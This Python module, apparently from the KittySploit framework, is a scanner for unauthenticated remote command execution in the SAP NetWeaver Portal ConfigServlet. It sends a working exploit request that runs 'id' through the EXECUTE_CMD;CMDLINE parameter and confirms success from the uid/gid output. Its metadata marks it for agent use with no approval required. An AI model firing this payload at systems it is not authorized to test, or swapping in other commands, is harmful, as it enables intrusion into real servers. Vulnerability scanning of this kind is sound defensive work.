#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SAP NetWeaver Portal ConfigServlet RCE."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SAP NetWeaver Portal - ConfigServlet RCE Detection',
        'description': (
            'Detects SAP ConfigServlet command execution via '
            'EXECUTE_CMD;CMDLINE=id on /ctc/servlet/ConfigServlet/.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'sap', 'netweaver', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/24996',
        ],
    }

    def run(self):
        for base in ('', '/irj'):
            path = (
                f'{base}/ctc/servlet/ConfigServlet/'
                '?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=id'
            )
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if r and re.search(r'uid=\d+.*gid=\d+', r.text or ''):
                self.set_info(
                    severity='critical',
                    reason='SAP ConfigServlet RCE',
                    path=f'{base}/ctc/servlet/ConfigServlet/',
                )
                return True
        return False
